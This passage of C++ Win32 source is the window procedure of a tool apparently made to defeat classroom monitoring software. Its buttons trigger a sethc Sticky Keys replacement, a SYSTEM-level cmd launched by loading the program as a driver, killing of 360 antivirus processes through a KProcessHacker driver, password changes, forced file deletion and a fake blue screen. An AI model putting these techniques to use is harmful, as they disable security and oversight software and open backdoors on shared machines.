				wchar_t* t = mywcsrchr(strFile, L'\\');
				mywcscpy(TDPath, strFile);
				mywcscpy(TDName, t + 1);
				TDsearched = TRUE;
				SetTDPathStr();
			}
			break;
		}
		case 4: 
		{if(!Admin)if (RunWithAdmin(Name))ExitProcess(0);//�Թ���ԱȨ������
			break;
			
		}
		case 5:
		{
			//s(12345);
			ShellExecute(NULL, L"open", L"https://tdt.mysxl.cn", NULL, NULL, SW_SHOW);
			//RunEXE(L"www.baidu.com",0,0); 
			break;
		}
		}


		if (Main.Button[Main.CoverButton].Percent < 20)goto nobutton;
		switch (Main.CoverButton)//��ť
		{
		case BUT_MAIN: { Main.SetPage(1); ShowWindow(FileList, SW_HIDE); break; }//�л�ҳ��
		case BUT_TOOLS:
		{
			Main.SetPage(2); ShowWindow(FileList, SW_HIDE);
			SetTimer(Main.hWnd, TIMER_REFRESH_TD, 250, (TIMERPROC)TimerProc);
			RefreshTDstate();
			break;
		}
		case BUT_OTHERS:
		{
			Main.SetPage(3);
			ShowWindow(FileList, SW_HIDE);
			break;
		}
		case BUT_ABOUT:
		{
			if (!InfoChecked)
			{//�л���ҳ��4ʱ���Զ�Ѱ�Ҽ������CPUռ�����Ը�����������
				InfoChecked = TRUE;
				UpdateInfo();
				wchar_t Tempstr[MAX_PATH];
				mywcscpy(Tempstr, TDTempPath);
				mywcscat(Tempstr, L"xiaofei.jpg");
				ReleaseRes(Tempstr, IMG_ZXF, L"JPG");
			}
			ShowWindow(FileList, SW_HIDE);
			Main.SetPage(4);
			break; }
		case BUT_SETT:
		{
			if (FileList == NULL)
			{
				FileList = CreateWindowW(L"ListBox", 0, WS_CHILD | LBS_STANDARD, (int)(180 * Main.DPI), (int)(404 * Main.DPI), \
					(int)(265 * Main.DPI), (int)(125 * Main.DPI), Main.hWnd, (HMENU)1, Main.hInstance, 0);
				//���������ļ�ѡ��ListBox
				::SendMessage(FileList, WM_SETFONT, (WPARAM)Main.DefFont, 1);
				ReleaseLanguageFiles(TDTempPath, 0, 0);
			}
			SearchLanguageFiles();
			Main.SetPage(5);
			ShowWindow(FileList, SW_SHOW);
			break;
		}//�л�������ҳʱ���������ļ�

		case BUT_ONEK:
		{//һ����װ
			OneClick = !OneClick;
			if (OneClick)
			{
				SetTimer(Main.hWnd, TIMER_ONEKEY, 1500, (TIMERPROC)TimerProc);
				mywcscpy(Main.Button[Main.CoverButton].Name, Main.GetStr(L"unQS"));
				Main.InfoBox(L"OneOK");//�л���ť״̬
			}
			else
			{
				KillTimer(Main.hWnd, TIMER_ONEKEY);
				mywcscpy(Main.Button[Main.CoverButton].Name, Main.GetStr(L"setQS"));
				Main.InfoBox(L"unQSOK");
			}
			Main.ButtonRedraw(Main.CoverButton);//˵��"��װ"����ʵ��ע����һ����ʱ������
			break;
		}
		case BUT_SETHC:
		{//��װ or ж�� sethc
			if (SethcInstallState == FALSE)
			{//��װsethc
				if (DeleteSethc() == FALSE) { Main.InfoBox(L"DSR3Fail"); break; }
				else SethcState = FALSE;//ɾ��sethc

				if (AutoSetupSethc())
				{
					mywcscpy(Main.Button[BUT_SETHC].Name, Main.GetStr(L"unQS"));
					SethcInstallState = TRUE;
				}
			}
			else
			{
				if (UninstallSethc())//���ִ�з�װ�õĺ����Ϳ�����
				{//��Ҫ�Ĺ����Ǹı䰴ť���ݺ��ػ�
					mywcscpy(Main.Button[BUT_SETHC].Name, Main.GetStr(L"sSethc"));
					SethcInstallState = FALSE;
				}
			}
			Main.ButtonRedraw(BUT_SETHC);
			break;
		}
		case BUT_HOOK://��װhook,����"ȫ���ȼ�"
		{
			if (HookState == FALSE)
			{
				if (FirstHook)if (!AutoRegisterHotKey(Main.hWnd, MAIN_HOTKEY_AUTOKILLTD, NULL, VK_SCROLL))break;
				FirstHook = FALSE;
				mywcscpy(Main.Button[Main.CoverButton].Name, Main.GetStr(L"unQS"));
				Main.InfoBox(L"hookOK");//�л���ť״̬
			}
			else
			{
				mywcscpy(Main.Button[Main.CoverButton].Name, Main.GetStr(L"hook"));
				Main.InfoBox(L"unQSOK");
			}
			HookState = !HookState;
			Main.ButtonRedraw(BUT_HOOK);
			break;
		}
		case BUT_START://����������������һ������
		{
			STARTUPINFO* si = (STARTUPINFO*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(STARTUPINFO));
			si->cb = sizeof(si);
			si->lpDesktop = szVDesk;
			if (Bit == 34)if (mywcsstr(Main.Edit[EDIT_RUNINVD].str, L"explorer") != 0)//�����32λ����������64λ�ϣ�������
				Main.SetEditStrOrFont(L"C:\\Windows\\explorer.exe", nullptr, EDIT_RUNINVD);//WindowsĿ¼��64λ��explorer
			RunEXE(Main.Edit[EDIT_RUNINVD].str, NULL, si);//(������syswow64�µ�)������explorer�᲻��ȫ��
			Main.EditRedraw(EDIT_RUNINVD);
			HeapFree(GetProcessHeap(), 0, si);
			break;
		}
		case BUT_SWITCH: {CreateThread(0, 0, SDThread, 0, 0, 0); break; }//�л�����
		case BUT_CATCH://��׽����
		{
			AutoCreateCatchWnd();

			CatchWndTimerLeft = mywtoi(Main.Edit[EDIT_DELAY].str);
			Main.SetStr(Main.Button[Main.CoverButton].Name, L"back");
			if (CatchWndTimerLeft < 1)CatchWndTimerLeft = 0;

			SetTimer(Main.hWnd, TIMER_CATCHWINDOW, 1000, (TIMERPROC)TimerProc);
			if (!Main.Check[CHK_NOHOOK].Value)Main.Check[CHK_NOHOOK].Value = TRUE, SetTimer(hWnd, TIMER_ANTIHOOK, 100, (TIMERPROC)TimerProc);
			break;
		}
		case BUT_VIEW://���Ӵ���
		{
			AutoCreateCatchWnd();
			wchar_t tmpstr[MAX_STR * 4];
			mywcscpy(tmpstr, Main.Edit[EDIT_PROCNAME].str);
			MonitorTot = 0;
			ReturnWindows();
			FindMonitoredhWnd(tmpstr);
			if (MonitorTot != 0)MonitorCur = 1; else MonitorCur = 0;
			SetTimer(Main.hWnd, TIMER_UPDATECATCH, 33, (TIMERPROC)TimerProc);//ע��:�����timerproc�ǰ���Main�ϵ�
			AutoRegisterHotKey(CatchWnd, CATCH_HOTKEY_WNDLEFT, MOD_ALT, VK_LEFT);
			AutoRegisterHotKey(CatchWnd, CATCH_HOTKEY_WNDRIGHT, MOD_ALT, VK_RIGHT);
			AutoRegisterHotKey(CatchWnd, CATCH_HOTKEY_ESCAPE, NULL, VK_ESCAPE);//ע���ȼ�
			AutoRegisterHotKey(CatchWnd, CATCH_HOTKEY_WNDSHOW, MOD_ALT, 'H');
			break;
		}
		case BUT_RELS: {ReturnWindows(); break; }//�ͷŴ���
		case BUT_APPCH: { AutoChangeChannel(mywtoi(Main.Edit[EDIT_APPLYCH].str)); break; }//�ı�Ƶ��
		case BUT_CLPSWD:
		{ //A U T O
			wchar_t tmp[MAX_STR];
			myZeroMemory(tmp, sizeof(wchar_t) * MAX_STR);
			AutoChangePassword(tmp, 1);
			break;
		}
		case BUT_VIPSWD: { AutoViewPass(); break; }//�鿴����
		case BUT_CHPSWD1:case BUT_CHPSWD2://��������
		{
			const size_t len = mywcslen(Main.Edit[EDIT_CPSWD].str) + 2;

			HANDLE hHeap = HeapCreate(HEAP_NO_SERIALIZE, 0, 0);
			if (!hHeap)break;

			wchar_t* str = (wchar_t*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(wchar_t) * (max(34, len)));
			if (str == 0) { error(); break; }
			mywcscpy(str, Main.Edit[EDIT_CPSWD].str);
			str[32] = str[33] = 0;
			if (Main.CoverButton == BUT_CHPSWD1)AutoChangePassword(str, 1); else AutoChangePassword(str, 2);
			HeapDestroy(hHeap);
			break;
		}
		case BUT_KILLTD: { AutoTerminateTD(); break; }//���� or ���´򿪼���
		case BUT_RETD: { CreateThread(NULL, 0, ReopenThread, NULL, 0, NULL);  break; }
		case BUT_ACTD://�Զ���׽����
		{
			if (TDhWndChild != 0 || TDhWndParent != 0)break;//��������Ѿ�����׽ -> �˳�
			AutoCreateCatchWnd();//׼��CatchWnd
			ReturnWindows();//�黹�Ѿ�����׽�Ĵ���
			MonitorTot = 0;
			KillTimer(hWnd, TIMER_UPDATECATCH);//�رմ��ڼ���
			for (int i = CATCH_HOTKEY_WNDLEFT; i < CATCH_HOTKEY_WNDSHOW + 1; ++i)AutoUnregisterHotKey(CatchWnd, i);
			TDhWndChild = TDhWndParent = 0;
			EnumWindows(EnumBroadcastwnd, NULL);//����Ѱ��2016��ļ���
			if (TDhWndChild == 0)EnumWindows(EnumBroadcastwndOld, NULL);//�Ҳ����Ļ���Ѱ�Ҿɰ�
			if (TDhWndChild == 0)Main.InfoBox(L"NoTDwnd");
			else
			{//�ҵ��� -> �Զ����� ��ֹ������
				if (!Main.Check[CHK_NOHOOK].Value)SetTimer(hWnd, TIMER_ANTIHOOK, 100, (TIMERPROC)TimerProc), Main.Check[CHK_NOHOOK].Value = TRUE;
				if (TDhWndParent == (HWND)-2)
				{
					RECT rc;
					GetClientRect(CatchWnd, &rc);
					SetWindowPos(TDhWndChild, 0, 0, 0, rc.right - rc.left, rc.bottom - rc.top, SWP_NOREDRAW);
				}
				else
					SetTimer(Main.hWnd, TIMER_CATCHEDTD, 100, (TIMERPROC)TimerProc);
				TOP = FALSE;
				Main.Check[CHK_TOP].Value = Main.Check[CHK_UT].Value = FALSE;//ȡ���������ڵ��ö�
				if (CatchWnd != NULL)SetWindowPos(CatchWnd, HWND_NOTOPMOST, 0, 0, 0, 0, 1 | 2);
				SetWindowPos(Main.hWnd, HWND_NOTOPMOST, 0, 0, 0, 0, 1 | 2);
				UpdateCatchedWindows();
			}
			break;
		}
		case BUT_SHUTD:
		{
			CreateThread(NULL, 0, ShutdownDeleterThread, 0, 0, NULL);
			break;
		}
		case BUT_SDESK:
		{//�����Ƶ�PaExec���Լ������ڰ�ȫ������
			if (!Admin) { Main.InfoBox(L"StartFail"); break; }
			CopyFile(Name, L"C:\\SAtemp\\myPaExec2.exe", FALSE);
			UnloadNTDriver(L"myPaExec2");
			LoadNTDriver(L"myPaExec2", L"C:\\SAtemp\\myPaExec2.exe", FALSE);
			UnloadNTDriver(L"myPaExec2");
			break;
		}
		case BUT_AUTO: { KillFullScreen(); break; }//�Զ��ر��ö�����
		case BUT_VFILE: { openfile(); break; }//ѡ���ļ�
		case BUT_VFOLDER: { BrowseFolder(); break; }//ѡ���ļ���
		case BUT_DELETE: {CreateThread(NULL, 0, DeleteThread, 0, 0, NULL); break; }//��ʼɾ���ļ� or �ļ���
		case BUT_BSOD: { BSOD(0); break; }//����
		case BUT_RESTART: { Restart(); break; }//��������
		case BUT_ARP:
		{//��Gamexx��ťһ���Ĵ���
			if (Main.Button[BUT_ARP].DownTot != 0)break;
			wchar_t tmp[MAX_PATH];
			mywcscpy(tmp, TDTempPath);
			mywcscat(tmp, L"arp.exe");
			if (GetFileAttributes(tmp) != -1)//arp.exe�ļ�����
			{//ֱ������
				if (!RunEXE(tmp, NULL, nullptr))Main.InfoBox(L"StartFail");
			}//����
			else CreateDownload(7);
			break;
		}
		case BUT_SYSCMD:
		{//systemȨ��cmd
			if (!Admin) { Main.InfoBox(L"StartFail"); break; }
			CopyFile(Name, L"C:\\SAtemp\\myPaExec.exe", FALSE);
			UnloadNTDriver(L"myPaExec");
			LoadNTDriver(L"myPaExec", L"C:\\SAtemp\\myPaExec.exe", FALSE);
			break;
		}
		case BUT_360://��������360
		{
			Main.InfoBox(L"360Start");
			if (!EnableKPH())Main.InfoBox(L"DrvFail");
			else
			{
				Main.Check[CHK_KPH].Value = TRUE;
				Main.Check[CHK_FMACH].Value = FALSE;//��ʱ�رս�������ȫƥ��
				KillProcess(L"360"); KillProcess(L"zhu"); KillProcess(L"sof");
			}
			break;
		}
		case BUT_MORE://����
		{//(���ܶ����˶���������)
			wchar_t tmp[MAX_PATH], tmp2[MAX_PATH];
			mywcscpy(tmp, L"Notepad ");
			mywcscpy(tmp2, TDTempPath);
			mywcscat(tmp2, L"help.txt");
			ReleaseRes(tmp2, FILE_HELP, L"JPG");
			mywcscat(tmp, tmp2);
			if (!RunEXE(tmp, NULL, nullptr))Main.InfoBox(L"StartFail");
			break;
		}
		case BUT_SYSINF://ϵͳ��Ϣ
		{
			wchar_t TempPath[] = L"C:\\Windows\\System32\\Msinfo32.exe";
			if (!RunEXE(TempPath, NULL, nullptr))Main.InfoBox(L"StartFail");
			break;
		}
		case BUT_HIDEST:
		{
			HideState = -1;
			if (CatchWnd)
			{
				ReturnWindows();
				ShowWindow(CatchWnd, SW_HIDE);
			}
			ShowWindow(Main.hWnd, SW_HIDE);
			break;
		}//��������
		case BUT_CLEAR: { ClearUp(); break; }//�����ļ����˳�
		case BUT_GAMES:
		{
			if (GameMode == 0)
			{//׼��չ����Ϸ����
				wchar_t tmp[MAX_PATH];
				mywcscpy(tmp, TDTempPath);
				mywcscat(tmp, L"Games\\");//����gamesĿ¼
				CreateDirectory(tmp, NULL);

				for (int i = 0; i < numGames; ++i)
				{//�����Ѵ��ڵ�Ŀ¼
					mywcscat(tmp, GameName[i]);
					if (GetFileAttributes(tmp) != -1)GameExist[i] = TRUE;
				}

				mywcscpy(Main.Button[Main.CoverButton].Name, Main.GetStr(L"Gamee"));//�Ѱ�ť�����"ֹͣ"
				GameMode = 1;
				if (!GameButtonLock)GameButtonLock = TRUE, CreateThread(NULL, 0, GameThread, 0, 0, NULL);//����չ�������߳�
				else GameMode = 0, mywcscpy(Main.Button[Main.CoverButton].Name, Main.GetStr(L"Games"));
			}
			else
			{//�ر���Ϸ����
				GameMode = 0;
				mywcscpy(Main.Button[Main.CoverButton].Name, Main.GetStr(L"Games"));
				if (!GameButtonLock)GameButtonLock = TRUE, CreateThread(NULL, 0, GameThread, 0, 0, NULL);
				else GameMode = 1, mywcscpy(Main.Button[Main.CoverButton].Name, Main.GetStr(L"Gamee"));
			}
			Main.ButtonRedraw(Main.CoverButton);
			break;
		}
		case BUT_GAME1:case BUT_GAME2:case BUT_GAME3:case BUT_GAME4:case BUT_GAME5:case BUT_GAME6: {//hangman and so on
			if (GameExist[Main.CoverButton - BUT_GAME1])
			{
				wchar_t TempPath[MAX_PATH];
				mywcscpy(TempPath, L"C:\\SAtemp\\Games\\");
				mywcscat(TempPath, GameName[Main.CoverButton - BUT_GAME1]);
				if (!RunEXE(TempPath, NULL, nullptr))Main.InfoBox(L"StartFail");
			}
			else { CreateDownload(Main.CoverButton - BUT_GAME1 + 1); }break;
		}
		case BUT_CLOSE: { MyExitProcess(); break; }//"�ر�"��ť
		default:break;
		}
	nobutton:
		if (!Main.Check[Main.CoverCheck].Value)
		{//δѡ��->ѡ��
			switch (Main.CoverCheck)
			{
			case CHK_FTOLD:case CHK_FTNEW: {//αװ������
				if (FF == TRUE)//ע����
				{
					MyRegisterClass(hInst, FakeProc, FakeWindow, CS_DROPSHADOW);
					FF = FALSE;
					FakeWnd = CreateWindowW(FakeWindow, Main.GetStr(L"Title"), WS_POPUP, 0, 0, 1, 1, nullptr, nullptr, hInst, nullptr);//��������
					SetWindowLong(FakeWnd, GWL_EXSTYLE, GetWindowLong(FakeWnd, GWL_EXSTYLE) | WS_EX_TOOLWINDOW);
				}//WS_EX_TOOLWINDOW:û��������ͼ���"����������"
				if (Main.CoverCheck == CHK_FTOLD)
				{
					ReleaseRes(L"C:\\SAtemp\\Fakeold.jpg", IMG_FAKEOLD, L"JPG");
					FakeToolbarNew = FALSE;//�ͷ�ͼƬ
					FakenewUp = FALSE;
					Main.Check[CHK_FTNEW].Value = FALSE;
					SetWindowPos(FakeWnd, HWND_TOPMOST, xLength / 2 - 41, 0, 82, 48, NULL);
					KillTimer(FakeWnd, TIMER_TOOLBAR);
				}
				else
				{
					HRGN rgn1 = CreateRoundRectRgn(0, 0, 342, 63, 11, 11), rgn2 = CreateRectRgn(0, 0, 342, 10), rgn = CreateRectRgn(0, 0, 0, 0);
					CombineRgn(rgn, rgn1, rgn2, RGN_OR);
					SetWindowRgn(FakeWnd, rgn, FALSE);
					ReleaseRes(L"C:\\SAtemp\\Fakenew.jpg", IMG_FAKENEW, L"JPG");
					FakeToolbarNew = TRUE;
					FakenewUp = FALSE;//αװ(��)Ҫ������չ/�����߳�
					Main.Check[CHK_FTOLD].Value = FALSE;
					SetWindowPos(FakeWnd, HWND_TOPMOST, xLength / 2 - 170, 0, 340, 63, NULL);
					FakeTimer = GetTickCount();
					SetTimer(FakeWnd, TIMER_TOOLBAR, 100, (TIMERPROC)TimerProc);
				}
				Main.Readd(REDRAW_CHECK, CHK_FTOLD); Main.Readd(REDRAW_CHECK, CHK_FTNEW);
				Main.Redraw({ (long)(165 * Main.DPI),(long)(238 * Main.DPI),(long)(300 * Main.DPI),(long)(279 * Main.DPI) });
				ShowWindow(FakeWnd, SW_SHOW);
				InvalidateRect(FakeWnd, nullptr, TRUE);
				UpdateWindow(FakeWnd);
				break; }
			case CHK_TOOLBAR: {
				NOTIFYICONDATA tnd;//αװͼ��
				tnd.cbSize = sizeof(NOTIFYICONDATA);
				tnd.hWnd = Main.hWnd;
				tnd.uID = 1;
				tnd.uFlags = 2 | 1 | 4;
				tnd.uCallbackMessage = 34;
				tnd.hIcon = LoadIconW(hInst, MAKEINTRESOURCE(IDI_TD));
				mywcscpy(tnd.szTip, Main.GetStr(L"tnd"));
				if (!Shell_NotifyIcon(NIM_ADD, &tnd))Main.InfoBox(L"StartFail"), Main.Check[CHK_TOOLBAR].Value = TRUE;
				break; }
			case CHK_RETD: {
				if (!AutoRegisterHotKey(Main.hWnd, MAIN_HOTKEY_RESTART_TD, MOD_CONTROL, 'Y'))
					Main.Check[CHK_RETD].Value = TRUE; Main.Redraw(Main.GetRECTc(CHK_RETD));
				break; }
			case CHK_T_A_:
			{//��������ɾ���ļ�
				if (!EnableTADeleter())Main.InfoBox(L"DrvFail"), Main.Check[CHK_T_A_].Value = !Main.Check[CHK_T_A_].Value;
				break;
			}
			case CHK_TOP: {
				TOP = TRUE;
				CreateThread(NULL, 0, TopThread, NULL, 0, NULL);
				if (!UTCheck)
				{
					UTCheck = TRUE;//��ʾ"�����ö�"
					Main.CreateCheck(290, 70, 5, 120, Main.GetStr(L"UT"));
					Main.Readd(REDRAW_CHECK, CHK_UT);
					Main.Redraw();
				}
				break;
			}//�ö�
			case CHK_BSOD: {AutoRegisterHotKey(Main.hWnd, MAIN_HOTKEY_BSOD, MOD_CONTROL, 'R'); break; }//����
			case CHK_SHUTD: {AutoRegisterHotKey(Main.hWnd, MAIN_HOTKEY_RESTART, MOD_CONTROL, 'T'); break; }//����
			case CHK_SCSHOT: {//��ͼαװ
				if (FS == TRUE)MyRegisterClass(hInst, ScreenProc, ScreenWindow, NULL), FS = FALSE;
				AutoRegisterHotKey(Main.hWnd, MAIN_HOTKEY_SCREENSHOT, MOD_CONTROL | MOD_ALT, 'P');
				break; }
			case CHK_REKILL: {KillProcess(Main.Edit[EDIT_TDNAME].str); SetTimer(hWnd, TIMER_KILLPROCESS, 1500, (TIMERPROC)TimerProc); break; }//������������
			case CHK_NOHOOK: {SetTimer(hWnd, TIMER_ANTIHOOK, 100, (TIMERPROC)TimerProc); break; }//��ֹ���̣���꣩����
			case CHK_KEYCTRL: {RegMouseKey(); break; }//���̿������
			case CHK_DPI: {Main.SetDPI(0.75); ::SendMessage(FileList, WM_SETFONT, (WPARAM)Main.DefFont, 1);
				SetWindowPos(FileList, 0, (int)(180 * Main.DPI), (int)(410 * Main.DPI), (int)(265 * Main.DPI), (int)(120 * Main.DPI), 0);
				if (UTState)GetWindowRect(Main.hWnd, &UTrc); break; }//��С/�Ŵ�
			case CHK_KPH:
			{//ʹ��KProcessHacker��������
				if (!EnableKPH())Main.InfoBox(L"DrvFail"), Main.Check[CHK_KPH].Value = !Main.Check[CHK_KPH].Value;
				break; }
			case CHK_UT:
			{
				TOP = FALSE; Main.Check[CHK_TOP].Value = TRUE;
				ULTRATopMost(); }
			}
		}
		else
		{//ѡ�� -> δѡ��
			switch (Main.CoverCheck)
			{//�ر�"αװ������"
			case CHK_FTOLD: case CHK_FTNEW: {ShowWindow(FakeWnd, SW_HIDE); KillTimer(FakeWnd, TIMER_TOOLBAR); break; }
			case CHK_TOOLBAR: {
				NOTIFYICONDATA tnd;
				tnd.cbSize = sizeof(NOTIFYICONDATA);
				tnd.hWnd = Main.hWnd;
				tnd.uID = 1;
				Shell_NotifyIcon(NIM_DELETE, &tnd);
				break; }//CHK_TDINVD 4
			case CHK_RETD: {AutoUnregisterHotKey(Main.hWnd, MAIN_HOTKEY_RESTART_TD); Main.Redraw(Main.GetRECTc(CHK_RETD)); break; }
			case CHK_TOP: {
				TOP = FALSE;
				if (UTState)noULTRA();
				Main.Check[CHK_UT].Value = FALSE;
				Main.Readd(REDRAW_CHECK, CHK_UT);
				Main.Redraw(Main.GetRECTc(CHK_UT));
				break;
			}
			case CHK_BSOD:case CHK_SHUTD: case CHK_SCSHOT: {AutoUnregisterHotKey(Main.hWnd, Main.CoverCheck - 4); break; }
			case CHK_REKILL: {KillTimer(hWnd, TIMER_KILLPROCESS); break; }//CHK_FMACH 12
			case CHK_NOHOOK: {KillTimer(hWnd, TIMER_ANTIHOOK); break; }
			case CHK_KEYCTRL: {UnMouseKey(); break; }//�����Ͼ��ǰ�֮ǰ�Ĺ��̷�����
			case CHK_DPI:
			{
				Main.SetDPI(1.5);
				::SendMessage(FileList, WM_SETFONT, (WPARAM)Main.DefFont, 1);
				SetWindowPos(FileList, 0, (int)(180 * Main.DPI), (int)(410 * Main.DPI), (int)(265 * Main.DPI), (int)(120 * Main.DPI), 0);
				if (UTState)GetWindowRect(Main.hWnd, &UTrc); break; }
			case CHK_UT:
			{
				noULTRA();
				TOP = TRUE;
				CreateThread(NULL, 0, TopThread, NULL, 0, NULL);
			}
			}
		}
		Main.LeftButtonUp2();
		break;
	}
	case WM_MOUSEMOVE:
	{
		Main.MouseMove();
		if (DragState.first > 0 && KEY_DOWN(VK_CONTROL))
		{
			const POINT point = Main.GetPos();
			if (DragState.first == DRAG_BUTTON)
			{
				Main.Button[DragState.second].Left = (long)(point.x / Main.DPI) - DragDefPoint.x;
				Main.Button[DragState.second].Top = (long)(point.y / Main.DPI) - DragDefPoint.y;
			}
			if (DragState.first == DRAG_EDIT)
			{
				Main.Edit[DragState.second].Left = (long)(point.x / Main.DPI) - DragDefPoint.x;
				Main.Edit[DragState.second].Top = (long)(point.y / Main.DPI) - DragDefPoint.y;
			}
			if (DragState.first == DRAG_CHECK)
			{
				Main.Check[DragState.second].Left = (long)(point.x / Main.DPI) - DragDefPoint.x;
				Main.Check[DragState.second].Top = (long)(point.y / Main.DPI) - DragDefPoint.y;
			}
			Main.Redraw();
		}
		else DragState.first = 0;
		const POINT p = Main.GetPos();
		if (p.x + p.y > (int)((Main.Width + Main.Height) * Main.DPI) - 30)
		{
			HCURSOR hc = LoadCursor(NULL, IDC_SIZENWSE);
			SetCursor(hc);
			DeleteObject(hc);
		}
		break;
	}
	case WM_IME_STARTCOMPOSITION: {Main.EditComposition(); break; }//�������뷨λ��
	case WM_DROPFILES://�����ļ���ק��Ϣ
	{
		POINT point = Main.GetPos();
		if (Main.InsideEdit(EDIT_FILEVIEW, point) == TRUE)//ֻ�����ѡ��EDIT_FILEVIEW��"����"������ק�ļ�
		{
			Main.SetEditStrOrFont(L" ", NULL, EDIT_FILEVIEW);

			HDROP hDrop = (HDROP)wParam;//explorer����һ����ק����ļ���
			const unsigned int numFiles = DragQueryFileW(hDrop, 0xFFFFFFFF, 0, 0);//����ڽ�����ϢǰҪͳ��һ��һ���ж����ļ���

			HANDLE hHeap = HeapCreate(HEAP_NO_SERIALIZE, 0, 0);//Ȼ��������Ӧ���ڴ�ռ�
			if (!hHeap)break;//ע:DragQueryFile�ĵڶ���������0xFFFFFFFFʱ���ص�ʱ�ļ�����
			wchar_t* tmp = (wchar_t*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(wchar_t) * numFiles * MAX_PATH);
			if (tmp == 0) { error(); break; }
			for (unsigned int i = 0; i < numFiles; ++i)
			{
				wchar_t tmp2[MAX_PATH];
				myZeroMemory(tmp2, sizeof(wchar_t) * MAX_STR);
				DragQueryFileW(hDrop, i, tmp2, MAX_PATH);
				if (numFiles != 1)mywcscat(tmp2, L"|");
				mywcscat(tmp, tmp2);
			}
			DragFinish(hDrop);
			if (*Main.Edit[EDIT_FILEVIEW].OStr != 0)*Main.Edit[EDIT_FILEVIEW].OStr = 0;
			Main.SetEditStrOrFont(tmp, NULL, EDIT_FILEVIEW);
			Main.EditRedraw(EDIT_FILEVIEW);
			HeapDestroy(hHeap);
		}
		break;
	}
	case WM_DISPLAYCHANGE:
	{
		GetDeviceRect();
		break;
	}
	case WM_MOUSELEAVE://TrackMouseEvent��������Ϣ
		PostMessage(Main.hWnd, WM_MOUSEMOVE, NULL, 0);
		break;
	case WM_CHAR: { Main.EditCHAR((wchar_t)wParam); break; }//��Editת����Ϣ
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return 0;
}

LRESULT CALLBACK ScreenProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)//��ͼαװ����
{
	PAINTSTRUCT ps;
	switch (message)
	{
	case WM_CREATE:
		stdc = GetDC(hWnd);//��������DC(������������bitmap)
		shdc = CreateCompatibleDC(stdc);
		AutoRegisterHotKey(hWnd, SCREEN_HOTKEY_ESCAPE, NULL, VK_ESCAPE);//ע��EscΪ�ر��ȼ�
		SwitchToThisWindow(hWnd, NULL);
		break;
	case WM_HOTKEY:
		AutoUnregisterHotKey(hWnd, SCREEN_HOTKEY_ESCAPE);
		ScreenState = 0;//�����ȼ�ʱ�رմ���
		DestroyWindow(hWnd);
		break;
	case WM_PAINT:
	{
		stdc = BeginPaint(hWnd, &ps);

		HBITMAP bitmap;//�ӻ����ļ�����ȡ����ͼ
		bitmap = (HBITMAP)LoadImage(hInst, L"C:\\SAtemp\\ScreenShot.bmp", IMAGE_BITMAP, 0, 0, LR_LOADFROMFILE);
		SelectObject(shdc, bitmap);

		SetStretchBltMode(stdc, HALFTONE);//�Ƚ���ͼ��ӡ�ڻ���DC�ϣ�Ȼ����������ʵDC��������ȶ���(��ֹ��;�л��ֱ���)
		StretchBlt(stdc, 0, 0, xLength, yLength, shdc, 0, 0, xLength, yLength, SRCCOPY);
		DeleteObject(bitmap);

		EndPaint(hWnd, &ps);
		break; }
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return 0;
}

LRESULT CALLBACK BSODProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{//αװ�����������Ӧ����
	PAINTSTRUCT ps;
	switch (message)
	{
	case WM_CLOSE://αװ�������ڱ��ر�ʱ�˳���������
		MyExitProcess();
		break;
	case WM_CREATE:
		btdc = GetDC(hWnd);//��������DC�ͻ���bitmap
		bhdc = CreateCompatibleDC(btdc);
		BSODBitmap = CreateCompatibleBitmap(btdc, xLength, yLength);
		SelectObject(bhdc, BSODBitmap);
		ReleaseDC(hWnd, btdc);
		break;
	case WM_PAINT:
	{
		LockCursor();//αװ����ʱ������������½��Է�������
		btdc = BeginPaint(hWnd, &ps);
		if (Main.Check[CHK_OLDBSOD].Value == FALSE)//FALSE -> �°�����
		{
			SetTextColor(bhdc, COLOR_WHITE);
			SelectObject(bhdc, BSODPen);
			SelectObject(bhdc, BSODBrush);
			SetBkMode(bhdc, 1);//�°���������һ���������ִ�С������
			HFONT A = CreateFontW(40, 15, 0, 0, FW_NORMAL, 0, 0, 0, 0, 0, 0, PROOF_QUALITY, DEFAULT_PITCH | FF_SWISS, L"΢���ź�"),
				B = CreateFontW(140, 70, 0, 0, FW_NORMAL, 0, 0, 0, 0, 0, 0, PROOF_QUALITY, DEFAULT_PITCH | FF_SWISS, L"Century Gothic"),
				C = CreateFontW(26, 10, 0, 0, FW_NORMAL, 0, 0, 0, 0, 0, 0, PROOF_QUALITY, DEFAULT_PITCH | FF_SWISS, L"΢���ź�");
			SelectObject(bhdc, B);
			Rectangle(bhdc, 0, 0, xLength, yLength);
			TextOut(bhdc, 180, 120, L":(", 2);//��ӡ:(
			SelectObject(bhdc, A);//Century Gothic������win7����ǰ��ϵͳ��Ĭ��û��
			TextOut(bhdc, 180, 290, Main.GetStr(L"BSOD1"), (int)mywcslen(Main.GetStr(L"BSOD1")));
			wchar_t tmp[MAX_STR];
			myZeroMemory(tmp, sizeof(wchar_t) * MAX_STR);
			if (BSODstate > 500)BSODstate = 500;
			myitow(int(BSODstate / 5), tmp, 10);
			mywcscat(tmp, Main.GetStr(L"BSOD7"));//��ӡ"��ɱ���"
			TextOut(bhdc, 180, 360, tmp, (int)mywcslen(tmp));
			SelectObject(bhdc, WhiteBrush);
			Rectangle(bhdc, 180, 440, 180 + 141, 440 + 141);
			SelectObject(bhdc, BSODBrush);
			for (int i = 0; i < 25; ++i)//��ӡ��ά��
				for (int j = 0; j < 25; ++j)if ((QRcode[i] >> (24 - j)) % 2)Rectangle(bhdc, 188 + 5 * j, 448 + 5 * i, 188 + 5 + 5 * j, 448 + 5 + 5 * i);
			SelectObject(bhdc, C);

			TextOut(bhdc, 345, 440, Main.GetStr(L"BSOD2"), (int)mywcslen(Main.GetStr(L"BSOD2")));
			TextOut(bhdc, 345, 470, Main.GetStr(L"BSOD3"), (int)mywcslen(Main.GetStr(L"BSOD3")));//��ӡ��������
			TextOut(bhdc, 345, 520, Main.GetStr(L"BSOD4"), (int)mywcslen(Main.GetStr(L"BSOD4")));
			TextOut(bhdc, 345, 550, Main.GetStr(L"BSOD5"), (int)mywcslen(Main.GetStr(L"BSOD5")));
			TextOut(bhdc, 345, 580, Main.GetStr(L"BSOD6"), (int)mywcslen(Main.GetStr(L"BSOD6")));
